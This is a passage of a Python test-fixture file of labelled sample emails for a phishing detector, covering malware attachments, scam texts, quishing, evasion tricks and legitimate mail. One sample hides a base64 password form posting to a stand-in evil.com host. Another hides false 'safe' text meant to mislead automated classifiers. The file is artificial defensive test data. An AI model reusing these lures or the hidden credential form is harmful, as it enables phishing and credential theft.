                "from unknown (HELO billing-dept.xyz) (103.45.67.89) "
                "by mx.targetcorp.com with SMTP; 01 May 2026 16:45:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=billing-dept.xyz; "
                "dkim=none; dmarc=fail header.from=billing-dept.xyz"
            )},
        ],
        return_path_address="noreply@billing-dept.xyz",
        attachments=[
            {
                "filename": "invoice_2026_0451.pdf.exe",
                "mime_type": "application/x-msdownload",
                "size_bytes": 245760,
            },
        ],
    ),
}

MALWARE_MACRO_DOC = {
    "label": "Malware delivery — Word doc with macros, enable content prompt",
    "tags": ["attachment_macro", "auth_fail", "urgency"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-002",
        sender_address="scanner@office-docs.net",
        recipient="employee@targetcorp.com",
        subject="Scanned document from Xerox WorkCentre",
        date="2026-05-01T10:30:00+00:00",
        body_text=(
            "You have received a scanned document.\n\n"
            "Please open the attached file. If you see a yellow bar at the top, "
            "click 'Enable Content' to view the document.\n\n"
            "Xerox WorkCentre 7855"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "scanner@office-docs.net"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=none smtp.mailfrom=office-docs.net; "
                "dkim=none; dmarc=none header.from=office-docs.net"
            )},
        ],
        attachments=[
            {
                "filename": "Scan_20260501.docm",
                "mime_type": "application/vnd.ms-word.document.macroEnabled.12",
                "size_bytes": 98304,
            },
        ],
    ),
}

MALWARE_PASSWORD_PROTECTED_ZIP = {
    "label": "Malware delivery — password-protected archive, password in body",
    "tags": ["attachment_archive", "auth_fail", "urgency"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-003",
        sender_address="legal@court-notice-filing.com",
        recipient="defendant@targetcorp.com",
        subject="Court Notice — Case #2026-CV-4521",
        date="2026-05-01T14:30:00+00:00",
        body_text=(
            "Dear Sir/Madam,\n\n"
            "Please find the attached court notice regarding case #2026-CV-4521. "
            "The file is encrypted for your privacy.\n\n"
            "Password: Court2026!\n\n"
            "You must respond within 5 business days.\n\n"
            "Office of the Clerk"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "legal@court-notice-filing.com"},
            {"name": "To", "value": "defendant@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=court-notice-filing.com; "
                "dkim=none; dmarc=fail header.from=court-notice-filing.com"
            )},
        ],
        attachments=[
            {
                "filename": "Court_Notice_2026-CV-4521.zip",
                "mime_type": "application/zip",
                "size_bytes": 51200,
            },
        ],
    ),
}

MALWARE_HTML_ATTACHMENT = {
    "label": "Malware delivery — HTML attachment with embedded JavaScript phishing page",
    "tags": ["attachment_exe", "auth_fail", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="malware-004",
        sender_address="voicemail@unified-comms.net",
        recipient="user@targetcorp.com",
        subject="You have a new voicemail message",
        date="2026-05-01T12:15:00+00:00",
        body_text="You have a new voicemail. Please open the attached file to listen.",
        body_html="",
        headers=[
            {"name": "From", "value": "voicemail@unified-comms.net"},
            {"name": "To", "value": "user@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=unified-comms.net; "
                "dkim=none; dmarc=fail header.from=unified-comms.net"
            )},
        ],
        attachments=[
            {
                "filename": "voicemail_message.html",
                "mime_type": "text/html",
                "size_bytes": 15360,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  5. SCAMS — 419 / ADVANCE FEE / SEXTORTION / LOTTERY
# ═══════════════════════════════════════════════════════════════════════════

NIGERIAN_419_SCAM = {
    "label": "Classic 419 advance-fee scam — inheritance, large sum, secrecy",
    "tags": ["nigerian_fraud", "freemail", "wire_transfer", "secrecy"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-001",
        sender_address="barrister.williams@yahoo.co.uk",
        recipient="beneficiary@example.com",
        subject="CONFIDENTIAL: USD $12.5 Million Inheritance",
        date="2026-05-01T06:00:00+00:00",
        body_text=(
            "Dear Beneficiary,\n\n"
            "I am Barrister James Williams, a solicitor based in London. "
            "My late client, Mr. David Thompson, left an estate worth "
            "USD $12,500,000.00 with no known next of kin.\n\n"
            "After extensive research, I believe you may be entitled to "
            "this inheritance. I require your full cooperation to process "
            "the claim before the government seizes the funds.\n\n"
            "Please provide:\n"
            "1. Your full name\n"
            "2. Phone number\n"
            "3. Bank account details for the transfer\n\n"
            "This matter is strictly confidential.\n\n"
            "Yours faithfully,\n"
            "Barrister James Williams"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "barrister.williams@yahoo.co.uk"},
            {"name": "To", "value": "beneficiary@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=yahoo.co.uk; "
                "dkim=pass header.d=yahoo.co.uk; dmarc=pass header.from=yahoo.co.uk"
            )},
        ],
    ),
}

SEXTORTION_SCAM = {
    "label": "Sextortion — claims to have compromising material, demands Bitcoin",
    "tags": ["sextortion", "threat", "wire_transfer", "freemail"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-002",
        sender_address="anonymous_hacker@protonmail.com",
        recipient="victim@example.com",
        subject="I know what you did",
        date="2026-05-01T03:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "I have gained access to your webcam and recorded you during "
            "some private moments. I also have your contact list.\n\n"
            "If you do not send $2,000 in Bitcoin to the following address "
            "within 48 hours, I will share the recordings with everyone "
            "you know:\n\n"
            "BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
            "Do not contact the police. I will know.\n\n"
            "You have 48 hours."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "anonymous_hacker@protonmail.com"},
            {"name": "To", "value": "victim@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=protonmail.com; "
                "dkim=pass header.d=protonmail.com; dmarc=pass header.from=protonmail.com"
            )},
        ],
    ),
}

LOTTERY_SCAM = {
    "label": "Lottery scam — you won a prize, provide personal details to claim",
    "tags": ["nigerian_fraud", "freemail", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="scam-003",
        sender_address="euroMillions-notification@hotmail.com",
        recipient="winner@example.com",
        subject="CONGRATULATIONS! You have won EUR 1,500,000",
        date="2026-05-01T04:15:00+00:00",
        body_text=(
            "EUROMILLIONS INTERNATIONAL LOTTERY\n"
            "WINNING NOTIFICATION\n\n"
            "Your email address was randomly selected as the winner of "
            "our annual EuroMillions promotion.\n\n"
            "Prize: EUR 1,500,000.00\n"
            "Reference: EURO/WIN/2026/0501\n\n"
            "To claim your prize, send the following to our claims agent:\n"
            "- Full name\n"
            "- Address\n"
            "- Phone number\n"
            "- Copy of ID/passport\n\n"
            "Contact: Dr. Peter Van Houten\n"
            "Email: claims.agent22@gmail.com\n\n"
            "CONGRATULATIONS ONCE AGAIN!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "euroMillions-notification@hotmail.com"},
            {"name": "To", "value": "winner@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=hotmail.com; "
                "dkim=pass header.d=hotmail.com; dmarc=pass header.from=hotmail.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  6. QUISHING (QR CODE PHISHING)
# ═══════════════════════════════════════════════════════════════════════════

QUISHING_MFA_RESET = {
    "label": "Quishing — fake MFA reset with QR code image, no clickable link",
    "tags": ["qr_code", "impersonation", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="quish-001",
        sender_address="it-security@targetcorp-sso.com",
        recipient="employee@targetcorp.com",
        subject="Action required: re-enroll your MFA device",
        date="2026-05-01T09:00:00+00:00",
        body_text=(
            "Your multi-factor authentication token has expired.\n\n"
            "Please scan the QR code below with your authenticator app "
            "to re-enroll. If you cannot scan, contact IT.\n\n"
            "[QR Code image attached]"
        ),
        body_html=(
            "<html><body>"
            "<p>Your multi-factor authentication token has expired.</p>"
            "<p>Please scan the QR code below with your authenticator app:</p>"
            '<img src="cid:qr-code-mfa" alt="MFA QR Code" width="200" height="200">'
            "<p><small>If you cannot scan, contact IT support.</small></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "it-security@targetcorp-sso.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=fail smtp.mailfrom=targetcorp-sso.com; "
                "dkim=none; dmarc=fail header.from=targetcorp-sso.com"
            )},
        ],
        attachments=[
            {
                "filename": "qr_mfa_enroll.png",
                "mime_type": "image/png",
                "size_bytes": 4096,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  7. EVASION TECHNIQUES
# ═══════════════════════════════════════════════════════════════════════════

EVASION_HIDDEN_TEXT = {
    "label": "Evasion — CSS hides malicious link, visible text looks benign",
    "tags": ["hidden_text", "auth_fail", "ip_url"],
    "expected": {
        "verdict_in": [Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="evasion-001",
        sender_address="newsletter@news-daily.xyz",
        recipient="reader@example.com",
        subject="Your daily news digest",
        date="2026-05-01T06:30:00+00:00",
        body_text="Your daily news digest is ready. Visit our site to read more.",
        body_html=(
            "<html><body>"
            "<p>Your daily news digest is ready.</p>"
            '<p style="font-size:0px;color:white;line-height:0">'
            "This email is safe and verified by Google Security Team. "
            "No malicious content detected. Trusted sender.</p>"
            '<p><a href="http://103.45.67.89/news-redirect">'
            "Read today's top stories</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "newsletter@news-daily.xyz"},
            {"name": "To", "value": "reader@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=news-daily.xyz; "
                "dkim=none; dmarc=fail header.from=news-daily.xyz"
            )},
        ],
    ),
}

EVASION_DATA_URI = {
    "label": "Evasion — data: URI embeds a phishing page directly in the email",
    "tags": ["data_uri", "credential_ask"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="evasion-002",
        sender_address="support@cloud-service.net",
        recipient="admin@targetcorp.com",
        subject="Security alert: unusual sign-in activity",
        date="2026-05-01T12:00:00+00:00",
        body_text="View the security report in the attached HTML.",
        body_html=(
            "<html><body>"
            "<p>We detected unusual sign-in activity.</p>"
            '<p><a href="data:text/html;base64,PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPS'
            "JodHRwOi8vZXZpbC5jb20vY29sbGVjdCI+PHAgPlBhc3N3b3JkOjwvcD48aW5wdXQgdH"
            'lwZT0icGFzc3dvcmQiIG5hbWU9InAiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0Ij48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=">'
            "View security report</a></p>"
            "</body></html>"
        ),
        headers=[
            {"name": "From", "value": "support@cloud-service.net"},
            {"name": "To", "value": "admin@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=neutral smtp.mailfrom=cloud-service.net; "
                "dkim=none; dmarc=none header.from=cloud-service.net"
            )},
        ],
    ),
}

EVASION_MULTI_LANGUAGE = {
    "label": "Evasion — mixed English/Russian text to confuse NLP classifiers",
    "tags": ["multi_lang", "auth_fail", "credential_ask", "urgency"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 35,
    },
    "email": _email(
        message_id="evasion-003",
        sender_address="security@bank-alerts.xyz",
        recipient="user@example.com",
        subject="Важно: Verify your account / Подтвердите аккаунт",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Dear customer,\n\n"
            "Ваш аккаунт заблокирован из-за подозрительной активности.\n"
            "Your account has been locked due to suspicious activity.\n\n"
            "Пожалуйста, перейдите по ссылке:\n"
            "Please click the link below:\n\n"
            "http://198.51.100.77/verify\n\n"
            "Спасибо / Thank you"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "security@bank-alerts.xyz"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=fail smtp.mailfrom=bank-alerts.xyz; "
                "dkim=none; dmarc=fail header.from=bank-alerts.xyz"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  8. LEGITIMATE EMAILS — MUST NOT FALSE-POSITIVE
# ═══════════════════════════════════════════════════════════════════════════

LEGIT_AMAZON_ORDER = {
    "label": "Legitimate Amazon order confirmation — valid auth, real domain",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-001",
        sender_address="ship-confirm@amazon.com",
        recipient="customer@gmail.com",
        subject="Your Amazon.com order #112-9876543-2109876 has shipped",
        date="2026-05-01T08:30:00+00:00",
        body_text=(
            "Hello,\n\n"
            "Your order has shipped! Here are the details:\n\n"
            "Order #112-9876543-2109876\n"
            "Arriving Tuesday, May 5\n"
            "USB-C Charging Cable (2-Pack)\n\n"
            "Track your package: https://www.amazon.com/gp/your-account/order-history\n\n"
            "Thank you for shopping with us.\n"
            "Amazon.com"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "ship-confirm@amazon.com"},
            {"name": "To", "value": "customer@gmail.com"},
            {"name": "Received", "value": (
                "from a25-43.smtp-out.amazonses.com (54.240.25.43) "
                "by mx.google.com with ESMTPS; 01 May 2026 08:30:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=amazonses.com; "
                "dkim=pass header.d=amazon.com; dmarc=pass header.from=amazon.com"
            )},
        ],
        return_path_address="0000014f1a2b3c4d-5e6f@amazonses.com",
    ),
}

LEGIT_MARKETING_NEWSLETTER = {
    "label": "Legitimate marketing — ESP return-path, valid auth, unsubscribe link",
    "tags": ["legitimate", "newsletter", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-002",
        sender_address="deals@shop.example.com",
        recipient="subscriber@gmail.com",
        subject="Weekend sale — 20% off everything",
        date="2026-05-01T09:00:00+00:00",
        body_text=(
            "Hi there!\n\n"
            "This weekend only, enjoy 20% off everything in our store.\n\n"
            "Shop now: https://shop.example.com/sale\n\n"
            "Unsubscribe: https://shop.example.com/unsubscribe?id=abc123\n"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "deals@shop.example.com"},
            {"name": "To", "value": "subscriber@gmail.com"},
            {"name": "List-Unsubscribe", "value": "<https://shop.example.com/unsubscribe?id=abc123>"},
            {"name": "Received", "value": (
                "from mta123.sendgrid.net (167.89.115.23) "
                "by mx.google.com with ESMTPS; 01 May 2026 09:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=sendgrid.net; "
                "dkim=pass header.d=shop.example.com; dmarc=pass header.from=shop.example.com"
            )},
        ],
        return_path_address="bounces+abc123@em.sendgrid.net",
    ),
}

LEGIT_GITHUB_NOTIFICATION = {
    "label": "Legitimate GitHub PR notification — valid auth, standard format",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-003",
        sender_address="notifications@github.com",
        recipient="developer@example.com",
        subject="[myorg/myrepo] Fix null pointer in auth middleware (#342)",
        date="2026-05-01T10:00:00+00:00",
        body_text=(
            "@colleague requested your review on:\n"
            "Fix null pointer in auth middleware (#342)\n\n"
            "Changes: src/auth/middleware.go (+12, -3)\n\n"
            "View: https://github.com/myorg/myrepo/pull/342\n\n"
            "— Reply to this email directly or view it on GitHub."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "GitHub <notifications@github.com>"},
            {"name": "To", "value": "developer@example.com"},
            {"name": "List-Unsubscribe", "value": "<https://github.com/notifications/unsubscribe>"},
            {"name": "Received", "value": (
                "from out-1.smtp.github.com (192.30.252.192) "
                "by mx.example.com with ESMTPS; 01 May 2026 10:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=github.com; "
                "dkim=pass header.d=github.com; dmarc=pass header.from=github.com"
            )},
        ],
    ),
}

LEGIT_PASSWORD_RESET = {
    "label": "Legitimate password reset — user-initiated, valid auth, real domain",
    "tags": ["legitimate", "transactional", "auth_pass", "credential_ask"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-004",
        sender_address="noreply@accounts.google.com",
        recipient="user@gmail.com",
        subject="Password reset request for your Google Account",
        date="2026-05-01T11:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "We received a request to reset the password for your Google Account "
            "(user@gmail.com).\n\n"
            "If you made this request, click the link below:\n"
            "https://accounts.google.com/signin/v2/challenge/password/reset?token=abc123\n\n"
            "If you didn't request this, you can ignore this email.\n\n"
            "This link will expire in 24 hours.\n\n"
            "The Google Accounts team"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "noreply@accounts.google.com"},
            {"name": "To", "value": "user@gmail.com"},
            {"name": "Received", "value": (
                "from mail-sor-f41.google.com (209.85.220.41) "
                "by mx.google.com with ESMTPS; 01 May 2026 11:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=accounts.google.com; "
                "dkim=pass header.d=accounts.google.com; dmarc=pass header.from=accounts.google.com"
            )},
        ],
    ),
}

LEGIT_INTERNAL_MEETING = {
    "label": "Legitimate internal meeting invite — corporate domain, auth pass",
    "tags": ["legitimate", "internal", "calendar", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-005",
        sender_address="calendar-server@targetcorp.com",
        recipient="employee@targetcorp.com",
        subject="Invitation: Sprint Planning (Weekly) @ Mon May 5 10:00am",
        date="2026-05-01T08:00:00+00:00",
        body_text=(
            "Sprint Planning (Weekly)\n\n"
            "When: Monday, May 5, 2026 10:00 AM - 11:00 AM\n"
            "Where: Conference Room B / https://meet.google.com/abc-defg-hij\n\n"
            "Agenda:\n"
            "- Review last sprint velocity\n"
            "- Groom backlog items\n"
            "- Assign stories for Sprint 24\n\n"
            "RSVP: Yes | No | Maybe"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "calendar-server@targetcorp.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
        attachments=[
            {
                "filename": "invite.ics",
                "mime_type": "text/calendar",
                "size_bytes": 1024,
            },
        ],
    ),
}

LEGIT_COLLEAGUE_WITH_ATTACHMENT = {
    "label": "Legitimate colleague email with PDF attachment — same domain, auth pass",
    "tags": ["legitimate", "internal", "attachment_safe", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-006",
        sender_address="alice@targetcorp.com",
        recipient="bob@targetcorp.com",
        subject="Q1 report — final version",
        date="2026-05-01T15:30:00+00:00",
        body_text=(
            "Hi Bob,\n\n"
            "Attached is the final Q1 report with the updated revenue numbers "
            "from finance. Let me know if you have any questions before "
            "Thursday's board meeting.\n\n"
            "Best,\nAlice"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "alice@targetcorp.com"},
            {"name": "To", "value": "bob@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
        attachments=[
            {
                "filename": "Q1_2026_Report_Final.pdf",
                "mime_type": "application/pdf",
                "size_bytes": 2097152,
            },
        ],
    ),
}

LEGIT_SLACK_NOTIFICATION = {
    "label": "Legitimate Slack notification — valid auth, standard transactional",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-007",
        sender_address="notification@slack.com",
        recipient="user@targetcorp.com",
        subject="3 new messages in #engineering",
        date="2026-05-01T13:45:00+00:00",
        body_text=(
            "You have 3 unread messages in #engineering:\n\n"
            "@dave: Deploy is done, all green\n"
            "@emma: Can someone review PR #891?\n"
            "@frank: Standup in 5\n\n"
            "View in Slack: https://targetcorp.slack.com/archives/C01234/p1234567890"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Slack <notification@slack.com>"},
            {"name": "To", "value": "user@targetcorp.com"},
            {"name": "List-Unsubscribe", "value": "<https://slack.com/account/notifications>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=slack.com; "
                "dkim=pass header.d=slack.com; dmarc=pass header.from=slack.com"
            )},
        ],
    ),
}

LEGIT_FREEMAIL_PERSONAL = {
    "label": "Personal email from freemail — friend sending a recipe, no red flags",
    "tags": ["legitimate", "freemail", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="special-004",
        sender_address="jane.doe.42@gmail.com",
        recipient="friend@example.com",
        subject="That pasta recipe you asked for",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hey!\n\n"
            "Here's the pasta recipe I was telling you about:\n\n"
            "Ingredients:\n"
            "- 400g spaghetti\n"
            "- 200g guanciale\n"
            "- 4 egg yolks\n"
            "- 100g pecorino romano\n"
            "- Black pepper\n\n"
            "Cook the pasta al dente, fry the guanciale, mix egg yolks with "
            "cheese, combine everything off heat. Done!\n\n"
            "Let me know how it turns out :)"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "jane.doe.42@gmail.com"},
            {"name": "To", "value": "friend@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

LEGITIMATE_INVOICE_WITH_ATTACHMENT = {
    "label": "Legitimate invoice with PDF — known vendor, valid auth",
    "tags": ["legitimate", "transactional", "attachment_safe", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="special-002",
        sender_address="invoices@aws.amazon.com",
        recipient="billing@targetcorp.com",
        subject="Your AWS invoice is available — May 2026",
        date="2026-05-01T06:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "Your AWS invoice for the billing period ending April 30, 2026 "
            "is now available. The total amount is $3,247.81.\n\n"
            "View your invoice: https://console.aws.amazon.com/billing/home\n\n"
            "Thank you for using Amazon Web Services."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "invoices@aws.amazon.com"},
            {"name": "To", "value": "billing@targetcorp.com"},
            {"name": "Received", "value": (
                "from email-smtp.us-east-1.amazonaws.com (54.240.31.8) "
                "by mx.targetcorp.com with ESMTPS; 01 May 2026 06:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=amazonses.com; "
                "dkim=pass header.d=aws.amazon.com; dmarc=pass header.from=aws.amazon.com"
            )},
        ],
        attachments=[
            {
                "filename": "AWS_Invoice_May2026.pdf",
                "mime_type": "application/pdf",
                "size_bytes": 102400,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  9. EDGE CASES & BOUNDARY CONDITIONS
# ═══════════════════════════════════════════════════════════════════════════

EMPTY_MINIMAL = {
    "label": "Empty / minimal email — no crash, no false positive",
    "tags": ["empty_body"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-001",
        sender_address="someone@example.com",
        recipient="other@example.com",
        subject="",
        body_text="",
        body_html="",
        headers=[
            {"name": "From", "value": "someone@example.com"},
            {"name": "To", "value": "other@example.com"},
        ],
    ),
}

SUBJECT_ONLY_NO_BODY = {
    "label": "Subject with no body — should handle gracefully",
    "tags": ["empty_body"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-002",
        sender_address="colleague@targetcorp.com",
        recipient="other@targetcorp.com",
        subject="Lunch at noon?",
        body_text="",
        body_html="",
        headers=[
            {"name": "From", "value": "colleague@targetcorp.com"},
            {"name": "To", "value": "other@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
    ),
}

BENIGN_URGENCY_LEGIT_SENDER = {
    "label": "Legitimate urgent email — real domain, auth passes, but urgent language",
    "tags": ["legitimate", "urgency", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-003",
        sender_address="ops@targetcorp.com",
        recipient="oncall@targetcorp.com",
        subject="URGENT: Production database is down",
        date="2026-05-01T02:15:00+00:00",
        body_text=(
            "The production PostgreSQL cluster is unreachable.\n\n"
            "Grafana: https://grafana.targetcorp.com/d/db-health\n"
            "PagerDuty incident: https://targetcorp.pagerduty.com/incidents/P12345\n\n"
            "Please respond immediately.\n\n"
            "— Automated monitoring"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "ops@targetcorp.com"},
            {"name": "To", "value": "oncall@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
    ),
}

SPF_SOFTFAIL_LEGIT_CONTENT = {
    "label": "SPF softfail but otherwise benign content",
    "tags": ["auth_fail", "legitimate"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="edge-005",
        sender_address="updates@small-vendor.com",
        recipient="user@example.com",
        subject="Your subscription renewal confirmation",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "This confirms your annual subscription renewal for $49.99. "
            "Your next billing date is May 1, 2027.\n\n"
            "Manage your subscription: https://small-vendor.com/account\n\n"
            "Thanks for being a customer!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "updates@small-vendor.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=small-vendor.com; "
                "dkim=pass header.d=small-vendor.com; dmarc=pass header.from=small-vendor.com"
            )},
        ],
    ),
}

VERY_LONG_BODY = {
    "label": "Very long email body — test truncation / performance, not malicious",
    "tags": ["legitimate", "newsletter"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-006",
        sender_address="digest@techcrunch.com",
        recipient="reader@example.com",
        subject="TechCrunch Daily Digest — May 1, 2026",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Today's top stories:\n\n" + "\n\n".join(
                f"Article {i}: Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
                f"Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
                f"Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris. "
                f"https://techcrunch.com/2026/05/01/article-{i}"
                for i in range(1, 51)
            )
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "digest@techcrunch.com"},
            {"name": "To", "value": "reader@example.com"},
            {"name": "List-Unsubscribe", "value": "<https://techcrunch.com/unsubscribe>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=techcrunch.com; "
                "dkim=pass header.d=techcrunch.com; dmarc=pass header.from=techcrunch.com"
            )},
        ],
    ),
}

MIXED_SIGNALS = {
    "label": "Mixed signals — auth passes but freemail sender with mild urgency (ambiguous)",
    "tags": ["freemail", "urgency", "auth_pass"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="edge-007",
        sender_address="realcontact@gmail.com",
        recipient="user@example.com",
        subject="Can you take a look at this ASAP?",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hey,\n\n"
            "I found this doc that might be relevant to the project. "
            "Can you take a look when you get a chance? No rush but "
            "it would be great to discuss before the meeting.\n\n"
            "https://docs.google.com/document/d/1aBcDeFgHiJkLmNoPqR\n\n"
            "Thanks!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "realcontact@gmail.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
